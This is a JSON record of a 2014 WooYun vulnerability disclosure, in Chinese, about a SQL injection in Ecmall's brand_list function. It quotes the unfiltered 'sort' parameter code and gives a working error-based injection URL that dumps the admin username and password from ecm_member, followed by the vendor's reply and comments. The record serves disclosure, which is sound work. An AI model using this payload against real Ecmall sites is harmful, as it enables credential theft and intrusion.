{"id": 3999, "wybug_id": "wooyun-2014-052124", "wybug_title": "Ecmall某处SQL注射漏洞", "wybug_corp": "ShopEx", "wybug_author": "ecbug", "wybug_date": "2014-02-27 10:51", "wybug_open_date": "2014-05-28 10:51", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-28：\t细节向公众公开  简要描述： 不修复那我就一个一个的提出来 详细说明：  缺陷文件：/app/my_goods.app.php\nfunction brand_list()    {        if (!empty($_GET['brand_name']) || !empty($_GET['store']))        {            $_GET['brand_name'] && $filtered = \" AND brand_name LIKE '%{$_GET['brand_name']}%'\";            $_GET['store'] && $filtered = $filtered . \" AND store_id = \" . $this->_store_id;        }        if (isset($_GET['sort']) && isset($_GET['order']))        {            $sort  = strtolower(trim($_GET['sort']));  //未过滤            $order = strtolower(trim($_GET['order']));            if (!in_array($order,array('asc','desc')))            {                $sort  = 'store_id';                $order = 'desc';            }        }        else        {            $sort  = 'store_id';            $order = 'desc';        }        $page = $this->_get_page(10);        $conditions = $this->_get_query_conditions($con);        $brand = $this->_brand_mod->find(array( //跟踪            'conditions' => \"(1=1 $conditions)\" . $filtered,            'limit' => $page['limit'],            'order' => \"$sort $order\",//here            'count' => true,        ));       function find($params = array())    {        extract($this->_initFindParams($params));        /* 字段(SELECT FROM) */        $fields = $this->getRealFields($fields);        $fields == '' && $fields = '*';        $tables = $this->table . ' ' . $this->alias;        /* 左联结(LEFT JOIN) */        $join_result = $this->_joinModel($tables, $join);        /* 原来为($join_result || $index_key)，忘了最初的用意，默认加上主键应该是只为了为获得索引的数组服务的，因此只跟索引键是否是主键有关 */        if ($index_key == $this->prikey || (is_array($index_key) && in_array($this->prikey, $index_key)))        {            /* 如果索引键里有主键，则默认在要查询字段后加上主键 */            $fields .= \",{$this->alias}.{$this->prikey}\";        }        /* 条件(WHERE) */        $conditions = $this->_getConditions($conditions, true);        /* 排序(ORDER BY) */        $order && $order = ' ORDER BY ' . $this->getRealFields($order);//跟踪\t\t……function getRealFields($src_fields_list)    {        $fields = $src_fields_list;        if (!$src_fields_list)        {            $fields = '';        }        $fields = preg_replace('/([a-zA-Z0-9_]+)\\.([a-zA-Z0-9_*]+)/e', \"\\$this->_getFieldTable('\\\\1') . '.\\\\2'\", $fields);//对注射语句没有影响        return $fields;}function _getFieldTable($owner)    {        if ($owner == 'this')        {            return $this->alias;        }        else        {            $m =& m($owner);            if ($m === false)            {                /* 若没有对象，则原样返回 */return $owner;            }            return $m->alias;        }    }\n存在注射   漏洞证明：  \n\n利用方法：注册会员开一个店铺访问：index.php?app=my_goods&act=brand_list&order=asc&sort=1 and (select user_name from ecm_member where user_id=1 union select 1 from (select count(*),concat(floor(rand(0)*2),(select concat(user_name,password) from ecm_member limit 0,1))a from information_schema.tables group by a)b)%23即可爆出用户名密码   修复方案：  过滤   版权声明：转载请注明来源 ecbug@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2014-02-27 12:30 厂商回复： 非常感谢您为shopex信息安全做的贡献改漏洞通过其他渠道已经提交过，并在处理中谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-27 11:48 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  ecmall真是个烂摊子啊，不知道shopex是不是想抛弃它    \n     2014-02-27 12:04 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @pandas - -!    \n     2014-02-27 12:17 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  这个没人管了的    \n     2014-02-27 12:18 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @xsser 那以后还需要找ecmall吗？    \n     2014-03-03 14:25 |    \t\t温柔杀手 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 这是个马甲，用来装比)\t\t \n  Ecmall已经被毁了不会更新了请放出修复方案    \n     2014-05-28 12:08 |    \t\tsecgov \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | 安全审计，漏洞挖掘,WAF. 揭露漏洞有风险，...)\t\t \n  废弃了    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}